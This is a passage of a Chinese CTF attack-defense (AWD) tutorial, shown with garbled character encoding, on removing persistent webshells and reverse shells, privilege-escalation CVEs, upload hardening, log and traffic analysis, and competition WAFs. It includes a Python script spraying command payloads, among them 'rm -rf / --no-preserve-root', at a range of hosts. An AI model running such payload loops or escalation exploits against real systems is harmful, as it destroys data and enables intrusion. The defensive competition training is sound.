--color=auto www-data</span><br></pre></td></tr></table></figure><p>(1)æ€è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 å¯¹åº”çš„è¿›ç¨‹å·</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">ps aux | grep www-data | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure><p>åŸç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">åˆ—å‡ºè¿›ç¨‹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">grep www-data</span><br><span class="line">åœ¨è¿›ç¨‹ä¿¡æ¯ä¸­æ‰¾åˆ°éœ€è¦æ€æ­»çš„è¿›ç¨‹</span><br><span class="line"></span><br><span class="line">grep -v grep</span><br><span class="line">åœ¨è¿›ç¨‹ä¿¡æ¯ä¸­å‰”é™¤å¸¦grepçš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">awk â€˜&#123;print $2&#125;â€™</span><br><span class="line">æå–å­—ç¬¦ä¸²è¡Œå†…å®¹çš„ç¬¬2ä¸ªå­—æ®µï¼Œä¹Ÿå°±æ˜¯å½“å‰ç¤ºä¾‹çš„è¿›ç¨‹å·</span><br><span class="line"></span><br><span class="line">xargs kill -9</span><br><span class="line">å°†è¿›ç¨‹å·ä½œä¸ºå‚æ•°ä¼ é€’ç»™kill -9è¿™ä¸ªå‘½ä»¤</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ é™¤ä¸æ­»é©¬æ–‡ä»¶</p><p>(2)é‡å¯phpç­‰webæœåŠ¡ï¼Œä¸æ¨èä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm restart</span><br></pre></td></tr></table></figure><p>(3)ç”¨ä¸€ä¸ªignore_user_abort(true)è„šæœ¬ï¼Œä¸€ç›´ç«äº‰å†™å…¥ï¼ˆæ–­æ–­ç»­ç»­ï¼‰ã€‚usleepè¦ä½äºå¯¹æ–¹ä¸æ­»é©¬è®¾ç½®çš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">while (1) &#123;</span><br><span class="line">    $pid=1234;  #ä¸æ­»é©¬è¿›ç¨‹</span><br><span class="line">    @unlink(&#x27;demo.php&#x27;);</span><br><span class="line">    exec(&#x27;kill -9 $pid&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    $file = &#x27;.3.php&#x27;;</span><br><span class="line">    $code = &#x27;hi springbird !&#x27;;</span><br><span class="line">    //pass=pass</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;);</span><br><span class="line">    //    usleep(5000);</span><br><span class="line">          usleep(1000);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>(4)åˆ›å»ºä¸€ä¸ªå’Œä¸æ­»é©¬ç”Ÿæˆçš„é©¬ä¸€æ ·åå­—çš„æ–‡ä»¶å¤¹ mkdir 1.php</p><p>å¾ªç¯åˆ›å»º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">dire=&quot;/var/www/html/.base.php/&quot;</span><br><span class="line">file=&quot;/var/www/html/.base.php&quot;</span><br><span class="line">rm -rf $file</span><br><span class="line">mkdir $dire</span><br><span class="line">./xx.sh</span><br></pre></td></tr></table></figure><h2 id="æ¸…é™¤åå¼¹shell"><a href="#æ¸…é™¤åå¼¹shell" class="headerlink" title="æ¸…é™¤åå¼¹shell"></a>æ¸…é™¤åå¼¹shell</h2><p>æŸ¥çœ‹è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef / px -aux</span><br></pre></td></tr></table></figure><p>å‡ºç°www-dataæƒé™çš„/bin/shä¸€èˆ¬ä¸ºnc</p><p>ç„¶åæ€è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill `ps -aux | grep www-data | grep apache2 | awk &#x27;&#123;print $2&#125;&#x27;`</span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨AWDä¸­ï¼Œä¸€èˆ¬éƒ½éœ€è¦ä¸“é—¨é˜²å¾¡åŠ å›ºè‡ªå·±æœåŠ¡å™¨çš„ç¯èŠ‚ï¼Œä½†åŠ å›ºçš„å¾ˆå¤šæ“ä½œéƒ½ä¼šæ¶‰åŠåˆ°rootæƒé™ï¼Œå¦‚æœç›´æ¥ç»™rootæƒé™æœ€å¥½ï¼Œä½†ä¸€èˆ¬åªä¼šç»™ä¸€ä¸ªæ™®é€šæƒé™è´¦å·ï¼Œè¿™æ—¶å€™å¾€å¾€å°±éœ€è¦ç»™æœåŠ¡å™¨ææƒäº†ã€‚</p><p>å…³äºææƒï¼Œé€šå¸¸æˆ‘ä»¬è¦æ ¹æ®kernelç‰ˆæœ¬å·æ‰¾åˆ°å¯¹åº”çš„pocï¼Œå¹³æ—¶æˆ‘ä»¬å¯ä»¥æ”¶é›†æµ‹è¯•ä¸€äº›æ¯”è¾ƒæ–°çš„ææƒpocï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚</p><p>å½±å“èŒƒå›´æ¯”è¾ƒå¤§çš„æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥ææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-6074 (DCCPåŒé‡é‡Šæ”¾æ¼æ´ &gt; 2.6.18 ) ï¼š</span><br><span class="line">DCCPåŒé‡é‡Šæ”¾æ¼æ´å¯å…è®¸æœ¬åœ°ä½æƒé™ç”¨æˆ·ä¿®æ”¹Linuxå†…æ ¸å†…å­˜ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡(ç³»ç»Ÿå´©æºƒ)æˆ–è€…æå‡æƒé™ï¼Œè·å¾—ç³»ç»Ÿçš„ç®¡ç†è®¿é—®æƒé™</span><br><span class="line"></span><br><span class="line">CVE-2016-5195(è„ç‰›ï¼Œkernel 2.6.22 &lt; 3.9 (x86/x64)) ï¼š</span><br><span class="line">ä½æƒé™ç”¨æˆ·å¯ä¿®æ”¹rootç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶å†…å®¹ï¼Œå¦‚ä¿®æ”¹ /etc/passwdï¼ŒæŠŠå½“å‰ç”¨æˆ·çš„ uid æ”¹æˆ 0 å³å¯æå‡ä¸ºrootæƒé™</span><br><span class="line"></span><br><span class="line">CVE-2016-8655(Ubuntu 12.04ã€14.04ï¼ŒDebian 7ã€8) ï¼š</span><br><span class="line">æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå¯ä»¥è®©ä½æƒé™çš„è¿›ç¨‹è·å¾—å†…æ ¸ä»£ç æ‰§è¡Œæƒé™</span><br><span class="line">POCï¼š&lt;https://www.seebug.org/vuldb/ssvid-92567&gt;</span><br><span class="line"></span><br><span class="line">CVE-2017-1000367(sudoæœ¬åœ°ææƒæ¼æ´ ) ï¼šL</span><br><span class="line">inux Kernel Stack Clashå®‰å…¨æ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºæ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†ä¸­çš„ä¸€ä¸ªå †æ ˆå†²çªæ¼æ´ï¼Œå®ƒå½±å“Linuxï¼ŒFreeBSDå’ŒOpenBSDï¼ŒNetBSDï¼ŒSolarisï¼Œi386å’ŒAMD64ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒç ´åå†…å­˜å¹¶æ‰§è¡Œä»»æ„ä»£ç  ã€‚</span><br><span class="line"></span><br><span class="line">CVE-2016-1247(Nginxæƒé™æå‡æ¼æ´) ï¼š</span><br><span class="line">NginxæœåŠ¡åœ¨åˆ›å»ºlogç›®å½•æ—¶ä½¿ç”¨äº†ä¸å®‰å…¨çš„æƒé™è®¾ç½®ï¼Œå¯é€ æˆæœ¬åœ°æƒé™æå‡ï¼Œæ¶æ„æ”»å‡»è€…èƒ½å¤Ÿå€Ÿæ­¤å®ç°ä» nginx/web çš„ç”¨æˆ·æƒé™ www-data åˆ° root ç”¨æˆ·æƒé™çš„æå‡ã€‚</span><br><span class="line">POCï¼š&lt;https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html&gt;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>åŸºæœ¬åŸåˆ™</p><ul><li>èƒ½ä¿®å¤çš„å°½é‡ä¿®å¤ï¼›</li><li>ä¸èƒ½ä¿®å¤çš„å…ˆæ³¨é‡Šæºç ï¼Œä¸å½±å“é¡µé¢æ˜¾ç¤ºå†åˆ é™¤ï¼›</li><li>ç«™ç‚¹å’Œå¯¹åº”çš„åŠŸèƒ½å°½å¯èƒ½ä¸å®•æœºï¼›</li></ul><p>æŠ€å·§</p><ul><li>è®¾ç½® wafï¼Œå¦‚ load_fileï¼›</li><li>å¯¹äºä¸€äº›æˆå‹çš„ CMSï¼Œæ‰¾åˆ°ç›¸åº”ç‰ˆæœ¬å·åï¼Œå¯¹å…¶ diffï¼›</li><li>ä¿®æ”¹å¼±å£ä»¤ç”¨æˆ·ï¼›</li><li>å¯¹äºè§‰å¾—å±é™©å‡½æ•°çš„åœ°æ–¹ç›´æ¥ä½¿ç”¨die()ï¼›</li></ul><p>æ¯”å¦‚æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¿®å¤ï¼Œå¯ä»¥åœ¨uploadç›®å½•ä¸‹å†™.htaccessç¦æ­¢phpæ–‡ä»¶æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/upload&quot;&gt;</span><br><span class="line">Options -ExecCGI -Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">php_flag engine off</span><br><span class="line">&lt;FilesMatch &quot;.+\\.ph(p[3457]?|t|tml)$&quot;&gt;</span><br><span class="line">deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>ä¸€äº›ä¿®å¤æŠ€å·§å‚è€ƒï¼š<a href="https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/">AWDæ”»é˜²èµ›ä¹‹å„ç±»æ¼æ´FIXæ–¹æ¡ˆ | Qftm</a></p><h2 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h2><p>å‘½ä»¤è¡ŒåŠ¨æ€æŸ¥çœ‹æ—¥å¿—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tailf /var/log/apache2/access.log</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨å·¥å…·è¿›è¡Œæ—¥å¿—åˆ†æï¼š<a href="https://security.tencent.com/index.php/opensource/detail/15">LogForensics è…¾è®¯å®éªŒå®¤ /webæ—¥å¿—å–è¯åˆ†æå·¥å…·</a></p><p>æ—¥å¿—çš„å­˜æ”¾åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/</span><br><span class="line">/usr/local/apache2/logs</span><br><span class="line">/usr/nginx/logs/</span><br></pre></td></tr></table></figure><p>ä¸ºäº†å¯¹å…¶ä»–é˜²å®ˆæ–¹è¿›è¡Œå¹²æ‰°ï¼Œå¯ä»¥åˆ©ç”¨è„šæœ¬å‘ç”Ÿå¤§é‡åƒåœ¾æ•°æ®åŒ…ï¼Œæ··æ·†è§†è§‰ï¼Œç»™å¯¹æ–¹äººå‘˜å¢åŠ æ£€æµ‹çš„éš¾åº¦ï¼Œæµªè´¹å¯¹æ–¹çš„æ—¶é—´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def scan_attack():</span><br><span class="line">    file=&#123;&#x27;shell.php&#x27;,&#x27;admin.php&#x27;,&#x27;web.php&#x27;,&#x27;login.php&#x27;,&#x27;1.php&#x27;,&#x27;index.php&#x27;&#125;</span><br><span class="line">    payload=&#123;&#x27;cat /flag&#x27;,&#x27;ls -al&#x27;,&#x27;rm -f&#x27;,&#x27;echo 1&#x27;,&#x27;echo 1 /proc/sys/net/ipv4/ip_forward&#x27;,&#x27;rm -rf / --no-preserve-root&#x27;&#125;</span><br><span class="line">    while(1):</span><br><span class="line">        for i in range(1, 50):</span><br><span class="line">            for ii in file:</span><br><span class="line">                url=&#x27;&lt;http://192.168.182&gt;.&#x27;+ str(i)+&#x27;/&#x27;+ii</span><br><span class="line">                print(url)</span><br><span class="line">                for iii in payload:</span><br><span class="line">                    data=&#123;</span><br><span class="line">                        &#x27;payload&#x27;:iii</span><br><span class="line">                    &#125;</span><br><span class="line">                    try:</span><br><span class="line">                        requests.post(url,data=data)</span><br><span class="line">                        print(&quot;æ­£åœ¨æ…å±:&quot;+str(i)+&#x27;|&#x27;+ii+&#x27;|&#x27;+iii)</span><br><span class="line">                        time.sleep(0.1)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        time.sleep(0.1)</span><br><span class="line">                        pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    scan_attack()</span><br></pre></td></tr></table></figure><h2 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h2><p>åœ¨æ¯”èµ›æœåŠ¡å™¨ä¸ŠæŠ“å–æµé‡åŒ…ï¼Œéœ€è¦çš„æƒé™æ¯”è¾ƒé«˜ï¼Œä¸€èˆ¬æ¯”èµ›ç”¨ä¸åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -s 0 -w flow.pcap port 80</span><br><span class="line"># ç„¶åä½¿ç”¨ scp å†™ä¸ªè„šæœ¬å®æ—¶å°†æµé‡åŒ…æ‹·è´åˆ°æœ¬åœ°</span><br><span class="line"></span><br><span class="line">tcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap</span><br><span class="line">å‘½ä»¤æ‹†è§£åˆ†æï¼š</span><br><span class="line">1ã€tcp: ip icmp arp rarp å’Œ tcpã€udpã€icmpè¿™äº›é€‰é¡¹ç­‰éƒ½è¦æ”¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®ï¼Œç”¨æ¥è¿‡æ»¤æ•°æ®æŠ¥çš„ç±»å‹</span><br><span class="line">2ã€-i eth1 : åªæŠ“ç»è¿‡æ¥å£eth1çš„åŒ…</span><br><span class="line">3ã€-t : ä¸æ˜¾ç¤ºæ—¶é—´æˆ³</span><br><span class="line">4ã€-s 0 : æŠ“å–æ•°æ®åŒ…æ—¶é»˜è®¤æŠ“å–é•¿åº¦ä¸º68å­—èŠ‚ã€‚åŠ ä¸Š-S 0 åå¯ä»¥æŠ“åˆ°å®Œæ•´çš„æ•°æ®åŒ…</span><br><span class="line">5ã€-c 100 : åªæŠ“å–100ä¸ªæ•°æ®åŒ…</span><br><span class="line">6ã€dst port ! 22 : ä¸æŠ“å–ç›®æ ‡ç«¯å£æ˜¯22çš„æ•°æ®åŒ…</span><br><span class="line">7ã€src net 192.168.1.0/24 : æ•°æ®åŒ…çš„æºç½‘ç»œåœ°å€ä¸º192.168.1.0/24</span><br><span class="line">8ã€-w ./target.cap : ä¿å­˜æˆcapæ–‡ä»¶ï¼Œæ–¹ä¾¿ç”¨wiresharkåˆ†æ</span><br></pre></td></tr></table></figure><p>PHPç‰ˆæµé‡ç›‘æ§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class="line"></span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //è®°å½•è®¿é—®è€…çš„ip</span><br><span class="line"></span><br><span class="line">$filename = $_SERVER[&#x27;PHP_SELF&#x27;]; //è®¿é—®è€…è¦è®¿é—®çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //è®¿é—®è€…è¦è¯·æ±‚çš„å‚æ•°</span><br><span class="line"></span><br><span class="line">$time = date(&#x27;Y-m-d H:i:s&#x27;,time()); //è®¿é—®æ—¶é—´</span><br><span class="line"></span><br><span class="line">$logadd = &#x27;æ¥è®¿æ—¶é—´ï¼š&#x27;.$time.&#x27;--&gt;&#x27;.&#x27;è®¿é—®é“¾æ¥ï¼š&#x27;.&#x27;http://&#x27;.$ip.$filename.&#x27;?&#x27;.$parameter.&quot;\\r\\n&quot;;</span><br><span class="line"></span><br><span class="line">// logè®°å½•</span><br><span class="line"></span><br><span class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</span><br><span class="line"></span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line"></span><br><span class="line">fclose($fh);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªé’ˆå¯¹phpçš„webæµé‡æŠ“å–ã€åˆ†æçš„åº”ç”¨ï¼š<a href="https://github.com/wupco">wupco</a>/<a href="https://github.com/wupco/weblogger">weblogger</a></p><p>ä½¿ç”¨æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/ (or other web dir)</span><br><span class="line"></span><br><span class="line">   git clone &lt;https://github.com/wupco/weblogger.git&gt;</span><br><span class="line"></span><br><span class="line">   chmod -R 777 weblogger/</span><br><span class="line"></span><br><span class="line">   open &lt;http://xxxxx/weblogger/install.php&gt; in Web browser</span><br><span class="line"></span><br><span class="line">   install it</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>wafçš„ä½œç”¨ï¼š</p><p>1.æœ€é‡è¦æ˜¯åˆ†ææµé‡ï¼Œåˆ«äººæ”»å‡»æˆ‘ä»¬çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ«äººçš„æ”»å‡»æ–¹å¼ã€‚è¿™æ ·çš„è¯å³ä½¿æˆ‘ä»¬æ‰¾ ä¸åˆ°æ”»å‡»ç‚¹ï¼Œéå¸¸è‹¦æ¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ†ææµé‡ï¼Œä½¿ç”¨åˆ«äººçš„æ”»å‡»æ–¹å¼ã€‚</p><p>2.å¯ä»¥ç›´æ¥è¿›è¡Œé˜²å¾¡ï¼Œç±»ä¼¼äºä¸€å°é˜²ç«å¢™ï¼ˆä¸€èˆ¬çš„æ¯”èµ›æ˜¯ä¸å…è®¸ä½¿ç”¨çš„ï¼Œæ¯•ç«Ÿæ¯”èµ›æ—¶é—´çŸ­ï¼Œå°±æ ¹æœ¬ç»•ä¸è¿‡å»wafï¼Œé‚£æ¯”èµ›å°±æ²¡æ„æ€äº†ï¼‰</p><p>æœ‰äº›æ¯”èµ›æ˜¯ä¸å…è®¸ä¸Šé€šç”¨wafçš„ï¼Œcheckæœºåˆ¶å¯èƒ½ä¼šcheckåˆ°wafè¿‡æ»¤çš„å‚æ•°ï¼Œå¯¼è‡´å®•æœºï¼Œwaféƒ¨ç½²éœ€è¦è°¨æ…ï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼šä¸Šå®Œwafæ£€æŸ¥æœåŠ¡æ˜¯å¦å¯ç”¨ï¼Œéƒ¨åˆ†æ£€æŸ¥å…è®¸ä½¿ç”¨éƒ¨åˆ†å°çš„wafï¼Œä¼šæ£€æŸ¥é¡µé¢å®Œæ•´æ€§ã€æœåŠ¡å®Œæ•´æ€§ã€‚</p><p>å¸¸ç”¨çš„wafä½¿ç”¨æ–¹æ³•ï¼Œæ˜¯ç”¨ä½ è¦ä¿æŠ¤çš„æ–‡ä»¶å»åŒ…å«è¿™ä¸ªwaf.phpã€‚æ¯”å¦‚è¯´ï¼Œä½ è¦ä¿æŠ¤select.phpï¼Œé‚£ä¹ˆä½ å°±åœ¨select.phpé‡Œé¢å†™ä¸Šä¸€è¡Œinclude â€˜./waf.phpâ€™æˆ–è€… require_once(â€˜waf.phpâ€™);</p><p>å¦‚æœä½ è¦ä¿æŠ¤æ‰€æœ‰æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±åœ¨configè¿™ç§é…ç½®æ–‡ä»¶é‡ŒåŒ…å«wafï¼Œå› ä¸ºè¿™ç§configçš„æ–‡ä»¶ï¼Œä¸€èˆ¬ä¼šè¢«å¤§éƒ¨åˆ†åŠŸèƒ½é¡µé¢è°ƒç”¨</p><p>ç½‘ä¸Šå¾ˆå¤šwafè„šæœ¬ï¼Œè¿™é‡Œä»‹ç»å‡ ä¸ªwafé¡¹ç›®</p><p><strong>1.AWD_PHP_WAF</strong></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/NonupleBroken/AWD_PHP_WAF">GitHub - NonupleBroken/AWD_PHP_WAF: a PHP WAF for AWD</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><p>ä½¿ç”¨å‰å…ˆä¿®æ”¹config.phpå†…çš„å¯†ç ï¼Œå¯†ç ä½¿ç”¨sha256åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šwafï¼š</span><br><span class="line">$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/g&quot;</span><br><span class="line"></span><br><span class="line">ä¸‹wafï¼š</span><br><span class="line">$ find . -path ./waffffff -prune -o -type f -name &quot;*.php&quot; -print | xargs sed -i &quot;s/&lt;?php include_once(\\&quot;\\/var\\/www\\/html\\/waffffff\\/waf.php\\&quot;);/&lt;?php/g&quot;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è®¿é—® web ç›®å½•ä¸‹çš„/waffffff/admin.php?password=123456</p><p><strong>2.CTF-WAF</strong></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/sharpleung/CTF-WAF">GitHub - sharpleung/CTF-WAF: é’ˆå¯¹CTFçº¿ä¸‹èµ›çš„é€šç”¨WAF,å¸¦æµé‡è½¬å‘ï¼Œæ—¥å¿—å®¡è®¡åŠŸèƒ½ã€‚</a></p><p><strong>3.awd-watchbird</strong></p><p>è¿™æ˜¯ä¸ªé€šé˜²wafï¼Œæ”¯æŒæµé‡è½¬å‘å’Œæ›¿æ¢flag</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts/awd-watchbird: A powerful PHP WAF for AWD</a></p><p>1.æ‰“åŒ…å¥½å¥½ä¹‹åç›´æ¥ä¸Šä¼ åˆ°htmlç›®å½•ä¸‹ï¼Œå›åˆ°ç»ˆç«¯ï¼Œåœ¨ä¸Šä¼ çš„wafç›®å½•ä¸‹ï¼Œä½¿ç”¨å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird.php --install /var/www/html</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½ä½¿æ¯ä¸ªé¡µé¢çš„phpä»£ç åŒ…å«åˆ°wafä¸‹</p><p>2.è¿è¡Œwaf ä¹‹åï¼Œæ‰“å¼€æˆ‘ä»¬çš„web é¡µé¢ï¼Œåœ¨ä»»æ„ä¸€ä¸ªphp é¡µé¢åé¢è¾“å…¥?watchbird=uiï¼Œå°±ä¼šè¿›å…¥åˆ°waf é…ç½®é¡µé¢ç„¶åè®¾ç½®å¯†ç (æ³¨æ„ï¼šç¬¬ä¸€æ¬¡æ‰“å¼€éœ€è¦è®¾ç½®å¯†ç )</p><p>3.é…ç½®å¥½ä¹‹åå°±èƒ½è¿›å…¥å†…éƒ¨ç½‘é¡µ</p><p><strong>4.AoiAWD</strong></p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/DasSecurity-HatLab/AoiAWD">GitHub - DasSecurity-HatLab/AoiAWD: AoiAWD-ä¸“ä¸ºæ¯”èµ›è®¾è®¡ï¼Œä¾¿æºæ€§å¥½ï¼Œä½æƒé™è¿è¡Œçš„EDRç³»ç»Ÿã€‚</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<a 